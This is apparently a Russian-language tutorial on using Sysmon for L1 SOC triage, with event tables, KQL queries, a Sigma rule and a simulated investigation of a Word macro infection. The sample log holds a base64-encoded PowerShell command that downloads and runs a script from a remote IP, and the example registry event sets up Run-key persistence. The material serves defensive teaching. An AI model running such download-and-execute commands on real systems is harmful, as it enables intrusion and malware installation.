# Ценность Sysmon для аналитика L1

## Место Sysmon в экосистеме мониторинга Windows и его роль для первой линии SOC

System Monitor (Sysmon) — драйвер режима ядра и пользовательская служба из набора Microsoft Sysinternals, регистрирующие детальную системную активность в специализированном журнале Windows (Microsoft\-Windows\-Sysmon/Operational). В отличие от встроенного аудита безопасности, Sysmon изначально проектировался для нужд расследования инцидентов, обнаружения угроз и Threat Hunting, предоставляя аналитику точный контекст каждого события. Для специалиста первой линии SOC (L1) Sysmon решает ключевую проблему: стандартные журналы Windows (Security, System) часто содержат лишь обезличенные записи, недостаточные для быстрого принятия решения «подозрительно/безопасно» без привлечения старших коллег. Sysmon целенаправленно заполняет эти пробелы, поставляя команду, из которой экстренно запущен процесс, хеши исполняемых файлов, цепочку родительских процессов, связь сетевой активности с конкретным бинарником, операции с реестром и многое другое.

Значение этого источника трудно переоценить: по данным [TryHackMe Sysmon Walkthrough](https://www.jalblas.com/blog/tryhackme-sysmon-walkthrough-soc-level-1), Sysmon «похож на журналы событий Windows, но с большей детализацией и гранулярным контролем» и способен фиксировать такие тонкие техники, как DLL Injection (Event ID 7, 8), timestomping (Event ID 2) или прямой доступ к диску (Event ID 9). Без Sysmon аналитик L1 часто вынужден гадать, является ли запуск powershell.exe легитимным, тратить время на корреляцию разрозненных событий и переходить к анализу хоста вручную. Sysmon превращает конечную точку в «чёрный ящик», фиксирующий события предсказуемо и единообразно, что позволяет L1 немедленно обратиться к хорошо документированному полю CommandLine, ParentImage или Hashes и классифицировать алерт.

Граница между Sysmon и EDR (Endpoint Detection and Response) принципиальна: Sysmon — это средство телеметрии, не обладающее возможностями активного блокирования, изоляции или поведенческого анализа на конечной точке. EDR-решения дополняют эту телеметрию, но зачастую скрывают внутренние механизмы. Sysmon же позволяет SOC-инженерам полностью контролировать, какие события регистрировать, и интегрироваться с любым SIEM. L1-аналитик, разбирая алерт, может адресно запросить сырой Sysmon-лог в SIEM, где каждая запись имеет чётко структурированные поля — это резко сокращает цикл первичного triage. Именно поэтому в публикации [LinkedIn (Rayan Tarakji)](https://www.linkedin.com/posts/rayanatarakjie_cybersecurity-sysmon-soc-activity-7364047705075077120-TNBj) утверждается: «в 2025 году ни одна SOC или DFIR‑команда не должна полагаться только на встроенные журналы» — Sysmon является «бесплатным, легковесным способом значительно усилить возможности обнаружения и расследования».

Для наглядного разграничения функциональности Sysmon и стандартного аудита безопасности ниже приведена сравнительная таблица, фиксирующая ключевые различия с точки зрения L1-аналитика.

| Характеристика | Журнал безопасности Windows (Security) | Sysmon (Microsoft\-Windows\-Sysmon/Operational) |
|----------------|----------------------------------------|-------------------------------------------------|
| Создание процесса | Event ID 4688. Поле CommandLine отключаемо и часто отсутствует; нет хешей; родительский процесс вычисляется опосредованно (по PID без гарантии) | Event ID 1. Всегда полная CommandLine, Hashes (SHA1, MD5, SHA256), ParentImage, ParentCommandLine, GrantingProcessId, целостность процесса |
| Сетевая активность | Event ID 5156 (фильтрация платформы). PID процесса может быть переиспользован, корреляция с процессом нестабильна | Event ID 3. Протокол, DestinationIp, DestinationPort, SourceIp, Image и PID процесса — однозначная связь |
| Загрузка DLL/драйверов | Отсутствует прямое событие; аудит драйверов (Event 6416) не привязан к процессу | Event ID 7 (Image Loaded) с полным путём, сигнатурой (Signed/Unsigned), хешем DLL, именем загружающего процесса |
| Изменения реестра | Event 4663 требует настройки SACL на каждый ключ, крайне шумный, нет процесса-инициатора по умолчанию | Event ID 13 (Registry Value Set) явно включает образ процесса, изменение, ключ и значение |
| Создание файлов | Event 4663 (WriteData) требует SACL на папки; запись появляется для каждого дескриптора, сложно отфильтровать | Event ID 11 (FileCreate) — всегда сообщает о создании файла полным путём и ответственным процессом |
| DNS-запросы | Нет встроенного прямого аналога | Event ID 22 (DnsQuery). Показывает QueryName, процесс, порядковый номер запроса — возможность обнаружения DGA/C2 |
| Инжекция в процесс | Не выявляется напрямую | Event ID 8 (CreateRemoteThread) явно фиксирует межпроцессные инъекции с адресами памяти |
| Дамп учётных данных | Обнаруживается косвенно через доступ к LSASS | Event ID 10 (ProcessAccess) с полями SourceImage и GrantedAccess — доступ к LSASS с флагом 0x1FFFFF |

Такое сопоставление показывает, почему Sysmon считается «обязательным» для L1: он поставляет ясный контекст, позволяя за минуты ответить на вопросы «какой процесс создал файл, с какой командой, кто его родитель, и с каким хешем», тогда как стандартный аудит оставил бы аналитика с одной датой и именем бинарника. Именно детализация событий — тот фактор, который превращает Sysmon в инструмент эскалации скорости триажа.

## Ключевые события Sysmon в работе аналитика L1: исчерпывающий обзор

Sysmon генерирует более 25 типов детализированных событий, но в повседневной практике аналитика L1 первоочередное значение приобретают около пятнадцати Event ID, покрывающих основные техники MITRE ATT&CK. Ниже представлена таблица, охватывающая обязательный для L1 набор сигнатур с их типичными индикаторами и привязкой к тактикам. Каждая запись сформулирована как база для фильтрации или поиска в SIEM — именно так, в виде SPL/KQL-запросов по конкретным полям, аналитик получает практическую пользу.

| Event ID | Название | Ключевые поля (для корреляции / поиска) | Типичные подозрительные паттерны (индикаторы для L1) | Техника MITRE ATT&CK |
|----------|----------|----------------------------------------|----------------------------------------------------|-----------------------|
| 1 | Process Creation | Image, CommandLine, ParentImage, ParentCommandLine, Hashes, IntegrityLevel | Родитель — офисное приложение (winword.exe) или скриптовый движок (wscript.exe) запускает cmd/powershell; закодированные команды (-enc, -e, -w hidden); Image в %TEMP%, %AppData%; неизвестный хеш в VirusTotal | T1059.001, T1204, T1218 |
| 2 | File Creation Time Change | Image, TargetFilename, CreationUtcTime, PreviousCreationUtcTime | Значительное расхождение времен создания файла и процесса; техника timestomping для сокрытия следов | T1070.006 |
| 3 | Network Connection | Image, SourceIp, DestinationIp, DestinationPort, Protocol | Подключение к нестандартным портам (4444, 8080) утилитами типа regsvr32 или powershell; исходящее на IP из списков IOC; серии коротких соединений на разные IP — признак C2 | T1071, T1571, T1043 |
| 5 | Process Terminated | Image, ExitCode | Аномальное завершение критических процессов безопасности (AV, EDR); массовое завершение сессий | T1562.001 |
| 7 | Image Loaded (DLL) | ImageLoaded, Signature, SigningStatus, ProcessId | Загрузка неподписанной DLL в чувствительный процесс (lsass, svchost); библиотеки с подозрительными именами (вроде `vbscript.dll` по нестандартному пути); DLL‑хиджинг | T1574.002, T1055.001 |
| 8 | CreateRemoteThread | SourceImage, TargetImage, StartAddress | Поток создан в адресном пространстве другого процесса (например, от powershell в lsass); комбинация SourceImage=cmd.exe, TargetImage=notepad.exe для обхода | T1055, T1055.001 |
| 10 | ProcessAccess | SourceImage, TargetImage, GrantedAccess | Доступ к процессу LSASS.exe с флагом 0x1FFFFF (или 0x1010) от подозрительного процесса; признак дампа учётных данных | T1003.001 |
| 11 | File Create | Image, TargetFilename | Создание исполняемых файлов в Startup‑папках, %AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup; дроппер в %TEMP% с немедленным последующим запуском | T1547.001, T1204.002 |
| 12 / 13 / 14 | Registry Events (Create/Delete/Set Value) | Image, TargetObject, Details | Запись в Run\-ключи (HKLM\..\Run, HKCU\..\Run); создание ключей типа AppCertDlls, Image File Execution Options; удаление легитимных ключей безопасности | T1547.001, T1037, T1112 |
| 22 | DnsQuery | Image, QueryName, QueryStatus | Обращения к доменам с высокой энтропией (DGA), недавно зарегистрированным, по алфавиту сгенерированным; запросы от системных процессов на несвойственные узлы | T1071.004, T1568 |
| 23 | File Delete | Image, TargetFilename | Массовое удаление журналов или теневых копий; удаление артефактов вскоре после заражения | T1070.004 |
| 24 | Clipboard Capture | Image, Session | Перехват содержимого буфера обмена процессом, не связанным с пользовательским интерфейсом | T1115 |
| 25 | Process Tampering | Image, Type | Манипуляции с памятью или потоками (например, смена защиты страниц) — признак обхода EDR | T1055 |

Эта группировка намеренно не включает все редкие Event ID (27, 28), так как в ежедневном потоке L1 фигурируют прежде всего перечисленные. Комбинации событий создают так называемые «сцепки»: Event1+Event3+Event10 — дамп учётных данных и выход в сеть; Event1+Event11 — дроппер с немедленным созданием бинарника; Event1+Event8 — инжекция кода. Аналитик L1, видя в SIEM коррелированную пачку, может немедленно поднять приоритет. Подобные цепочки подробно разобраны в [LinkedIn (Ali Raza)](https://www.linkedin.com/posts/ali-raza-8145982b3_sysmon-event-types-soc-analyst-must-activity-7401844827623018496-GFJs), где указаны «Filt Tip for SOC Analysts: Event 1+10+3 -> Credential theft + C2», «Event 1+8 -> Code injection», что прямо отражает методику работы первой линии.

Структура каждой записи Sysmon в XML/EVTX строго формализована, что позволяет SIEM (Splunk, Elastic, Sentinel) автоматически парсить поля в именованные атрибуты. Например, для Event ID 1 блок данных часто выглядит так (иллюстративная схема):

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698BB9C6}"/>
    <EventID>1</EventID>
    <TimeCreated SystemTime="..." />
  </System>
  <EventData>
    <Data Name="ProcessId">1234</Data>
    <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
    <Data Name="CommandLine">cmd /c whoami</Data>
    <Data Name="ParentImage">C:\Users\user\Desktop\malware.exe</Data>
    <Data Name="Hashes">SHA1=ABCD1234...,MD5=EFGH5678...</Data>
    ...
  </EventData>
</Event>
```

Именно такая структурность даёт аналитику немедленный доступ к CommandLine, ParentImage, Hashes без дополнительного разбора. При триаже L1 часто использует готовые дашборды, отображающие топ-процессов с подозрительными параметрами, аномальные соединения и пр.

Таким образом, Sysmon предоставляет L1 «обогащённый» слой, который позволяет не просто констатировать факт события, а сразу видеть контекст, связывающий аномалию с конкретной техникой MITRE, что является основой быстрого и точного реагирования.

## Интеграция Sysmon в рабочий процесс SOC: настройка, запросы и практика L1

Ценность Sysmon для L1 в максимальной степени раскрывается, когда его события поступают в SIEM и обрабатываются правилами корреляции. Типовой путь данных: Sysmon → агент сбора (Winlogbeat, Elastic Agent, Azure Monitor Agent) → централизованное хранилище → аналитический движок. Ключевой этап — настройка самого Sysmon, выполняемая через XML-файл конфигурации. Именно конфигурационный файл определяет, насколько события будут детальными и насколько мало ложных срабатываний попадёт на консоль L1. Шумный конфиг — прямой путь к усталости аналитика от false positive. Следовательно, компетенция L1 включает умение «читать» конфиг и понимать его влияние, даже если настройкой занимаются инженеры.

Два наиболее известных шаблона конфигураций: SwiftOnSecurity/sysmon-config (подход исключения известного легитимного поведения) и ION-Storm (inclusion‑based — регистрируется только то, что явно описано). Первый вариант проще для старта, но требует регулярного тюнинга; второй даёт высокоточные события, но может пропустить неизвестные угрозы. Пример фрагмента правила типового конфига (исключающий шум от служб Windows):

```xml
<Sysmon schemaversion="4.82">
  <EventFiltering>
    <RuleGroup name="Exclude normal system activity" groupRelation="or">
      <ProcessCreate onmatch="exclude">
        <Image condition="begin with">C:\Windows\System32\</Image>
        <CommandLine condition="contains">/c reg query</CommandLine>
      </ProcessCreate>
    </RuleGroup>
    <RuleGroup name="Include suspicious" groupRelation="or">
      <FileCreate onmatch="include">
        <TargetFilename condition="begin with">C:\Users\*\AppData\Local\Temp\</TargetFilename>
        <TargetFilename condition="end with">.exe</TargetFilename>
      </FileCreate>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

Такая конструкция подавляет массовые легитимные операции (запуск утилит из System32 с проверкой реестра) и одновременно гарантирует, что создание исполняемых файлов во временных папках будет зарегистрировано. L1, получая алерт или проводя поиск по Event ID 11, уверен, что запись с TargetFilename `C:\Users\user\AppData\Local\Temp\dropper.exe` точно относится к нестандартной активности.

После попадания в SIEM аналитик использует язык запросов платформы. Наиболее наглядный пример для платформы Microsoft Sentinel (KQL) — поиск подозрительных командных строк, который L1 выполняет в ходе pro‑active hunting или триажа текущего алерта:

```kql
Event
| where EventLog == "Microsoft-Windows-Sysmon/Operational"
| where EventID == 1
| extend CommandLine = tostring(EventData.CommandLine)
| extend Image = tostring(EventData.Image)
| extend ParentImage = tostring(EventData.ParentImage)
| where CommandLine contains "-enc" or CommandLine contains "-e " or CommandLine contains "IEX"
| project TimeGenerated, Computer, Image, ParentImage, CommandLine
```

Такой запрос возвращает список процессов PowerShell, запущенных с закодированными или деобфусцированными командами — классический признак атаки, маскирующейся под легитимный инструмент. Аналитик L1 может сразу оценить, знакомо ли сочетание ParentImage (например, Word) и Image (powershell.exe).

Типичная ошибка начинающего специалиста — пытаться анализировать единичное событие без учёта контекста. Sysmon сам по себе выдаёт богатый контекст, но только корреляция нескольких Event ID даёт подтверждение вредоносной активности. Поэтому SOC-инженеры разрабатывают корреляционные правила, которые автоматически генерируют алерты на основе двух‑трёх событий. Простейший пример сигма-правила (иллюстративная схема), которое может быть сопоставлено с Sysmon:

```
title: Suspicious Process from Office Application
description: Detects Microsoft Office applications spawning cmd or powershell with arguments
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 1
        ParentImage|endswith: 
            - '\winword.exe'
            - '\excel.exe'
            - '\powerpnt.exe'
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
    condition: selection
```

При срабатывании такого правила SIEM создаёт оповещение, и L1 получает уже обогащённый инцидент, в котором остаётся проверить команды и сопоставить с IOC, используя запросы, подобные приведённому выше. Таким образом, ценность Sysmon для L1 реализуется не только через сырые события, но и через экосистему автоматизированных детектов, резко сокращающих время первичной оценки.

Дополнительно стоит отметить важную практическую деталь: при установке Sysmon команда `Sysmon64.exe -accepteula -i config.xml` должна выполняться с правами администратора, а встроенный драйвер должен быть загружен. После этого служба стартует и пишет события в оперативный журнал. В крупных средах развёртывание автоматизируется групповыми политиками или системами управления конфигурациями. L1-аналитик, работая с готовой инфраструктурой, может даже не выполнять установку, но знание процесса и понимание необходимости корректного конфига необходимо для объяснения причин отсутствия ожидаемых событий в процессе расследования.

## Сквозной практический пример: расследование инцидента с макросом и закреплением через Sysmon

### Исходные условия
Эмуляция корпоративной среды: контроллер домена, пара рабочих станций Windows 10, на всех хостах установлен Sysmon с конфигурацией SwiftOnSecurity (v13.2). События форвардятся через Winlogbeat в Elasticsearch, аналитик работает в Kibana (версия 8.x). Логи также реплицированы в Microsoft Sentinel для демонстрационных целей, поэтому в примере используются Sentinel KQL-запросы. Роль L1 аналитика — оценка алерта «Potential Macro Execution» и первичное решение об эскалации.

### Ход расследования

#### Шаг 1. Получение и первичный просмотр алерта
На панели Sentinel появляется новый инцидент уровня Medium, сгенерированный правилом «Office App Spawning Cmd/PowerShell». Аналитик открывает детали и видит сводку:

```json
{
  "IncidentId": "INC-4729",
  "Title": "Potential Macro Execution - winword.exe → powershell.exe",
  "Severity": "Medium",
  "AssociatedAlerts": [
    {
      "AlertName": "Office App Spawning Cmd/PowerShell",
      "Entities": [
        {"Host": "WS-COMPLIANCE-01"}
      ],
      "StartTime": "2025-05-30T08:22:04Z"
    }
  ],
  "Description": "Suspicious process chain detected by Sysmon EventID 1. Parent: WINWORD.EXE. Child: powershell.exe. Investigate command line and subsequent activities."
}
```

L1 немедленно переходит к связанному Sysmon-событию, потому что алерт базируется на Event ID 1. Он выполняет поиск точного события по временной метке и имени компьютера.

#### Шаг 2. Анализ создания процесса (Event ID 1)
Аналитик запрашивает события за окрестность времени +/– 5 минут и получает детализированную запись Event ID 1. В упрощённом JSON (полученном из Sentinel) она выглядит так:

```json
{
  "TimeGenerated": "2025-05-30T08:22:04.123Z",
  "Computer": "WS-COMPLIANCE-01",
  "EventID": 1,
  "EventData": {
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell -NoP -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAyAC4AMQAxADkALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jsmith\\Downloads\\invoice.docm\"",
    "Hashes": "SHA1=12AB34...",
    "IntegrityLevel": "Medium"
  }
}
```

Здесь ветвь ParentImage = `WINWORD.EXE`, дочерний процесс — `powershell.exe` с флагом `-EncodedCommand`. Привычный приём — закодированная строка скрывает фактический скрипт. Даже без декодирования комбинация ParentImage + команда автоматически повышает уровень инцидента. Аналитик делает пометку: «подозрительный вызов PowerShell из Word с закодированной командой — возможно, макрос загружает второй этап».

#### Шаг 3. Поиск файловых артефактов: дроп полезной нагрузки (Event ID 11)
Следующим действием L1 проверяет, создавались ли новые файлы вскоре после запуска powershell.exe, особенно в распространённых местах дропа. Запрос:

```kql
Event
| where Computer == "WS-COMPLIANCE-01"
| where EventID == 11
| where TimeGenerated between (datetime(2025-05-30T08:22:00Z) .. datetime(2025-05-30T08:25:00Z))
| extend TargetFilename = tostring(EventData.TargetFilename)
| extend Image = tostring(EventData.Image)
| project TimeGenerated, TargetFilename, Image
```

Результат (ключевая запись):

```json
{
  "TimeGenerated": "2025-05-30T08:22:08.456Z",
  "EventID": 11,
  "EventData": {
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "TargetFilename": "C:\\Users\\jsmith\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x264upd.exe"
  }
}
```

Файл создан в папке Startup, что сразу же выглядит как типичное закрепление (persistence). Процесс-создатель — снова powershell.exe, что связывает шаги в цепочку. Аналитик фиксирует: «обнаружена установка персистентности через Startup-папку; вероятно, загружен и сброшен вредоносный исполняемый файл».

#### Шаг 4. Проверка сетевого взаимодействия (Event ID 3)
Для подтверждения факта обращения к командному центру L1 ищет сетевые соединения, инициированные powershell.exe в том же временном окне:

```kql
Event
| where Computer == "WS-COMPLIANCE-01"
| where EventID == 3
| where TimeGenerated between (datetime(2025-05-30T08:20:00Z) .. datetime(2025-05-30T08:25:00Z))
| extend Image = tostring(EventData.Image)
| where Image contains "powershell.exe"
| project TimeGenerated, DestinationIp = tostring(EventData.DestinationIp), DestinationPort = tostring(EventData.DestinationPort)
```

Ответ:

```json
{
  "TimeGenerated": "2025-05-30T08:22:05.987Z",
  "EventID": 3,
  "EventData": {
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "DestinationIp": "192.168.102.119",
    "DestinationPort": "80",
    "Protocol": "tcp"
  }
}
```

Исходящее соединение на внешний (в рамках сегмента — не внутренний сервер) IP по HTTP, временная привязка практически совпадает с запуском команды — верификация C2. Аналитик добавляет к кейсу: «подтверждён контакт с удалённым хостом, вероятно, загрузка следующей стадии».

#### Шаг 5. Анализ закрепления через реестр (Event ID 13)
Наконец, L1 собирает полную картину, проверяя изменения реестра тем же powershell.exe за тот же период (возможно, вторая волна закрепления). Запрос:

```kql
Event
| where Computer == "WS-COMPLIANCE-01"
| where EventID == 13
| where TimeGenerated between (datetime(2025-05-30T08:22:00Z) .. datetime(2025-05-30T08:25:00Z))
| extend Image = tostring(EventData.Image)
| where Image contains "powershell.exe"
| project TimeGenerated, TargetObject = tostring(EventData.TargetObject), Details = tostring(EventData.Details)
```

Вывод:

```json
{
  "TimeGenerated": "2025-05-30T08:22:09.001Z",
  "EventID": 13,
  "EventData": {
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "TargetObject": "HKU\\S-1-5-21-...-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\x264upd",
    "Details": "C:\\Users\\jsmith\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x264upd.exe"
  }
}
```

Двойное закрепление — папка Startup и Run-ключ — характерно для многих троянов. Таким образом, инцидент переходит в категорию True Positive. L1 эскалирует на L2, прикладывая все собранные события Sysmon (ID 1, 11, 3, 13) и резюме: «Макрос в документе invoice.docm запустил PowerShell с закодированной командой, загрузившей исполняемый файл и установившей персистентность через автозагрузку и реестр. Подтверждено сетевое взаимодействие. Рекомендуется изоляция хоста и дальнейший анализ вредоносного образца».

### Ожидаемый вывод
Сквозной пример показывает, что Sysmon снабдил аналитика L1 исчерпывающей информацией без необходимости заходить на хост. За счёт событий 1, 11, 3 и 13 была реконструирована полная цепочка атаки, определены индикаторы компрометации и принято обоснованное решение об эскалации. Без Sysmon аналитик, скорее всего, обнаружил бы только запуск powershell (если настроен аудит) и потратил бы часы на выяснение, что именно было выполнено и сохранилась ли нагрузка. Именно в этом заключается ключевая ценность Sysmon для первой линии — радикальное сокращение времени триажа и повышение уверенности в классификации алерта.

## Источники
- [Why Sysmon is a must-have for SOC Analysts in 2025 | Rayan Tarakji](https://www.linkedin.com/posts/rayanatarakjie_cybersecurity-sysmon-soc-activity-7364047705075077120-TNBj)
- [Sysmon Event Types for SOC Analysts | Ali Raza](https://www.linkedin.com/posts/ali-raza-8145982b3_sysmon-event-types-soc-analyst-must-activity-7401844827623018496-GFJs)
- [TryHackMe: Sysmon Complete Walkthrough (SOC Level 1) | Jasper Alblas](https://www.jalblas.com/blog/tryhackme-sysmon-walkthrough-soc-level-1)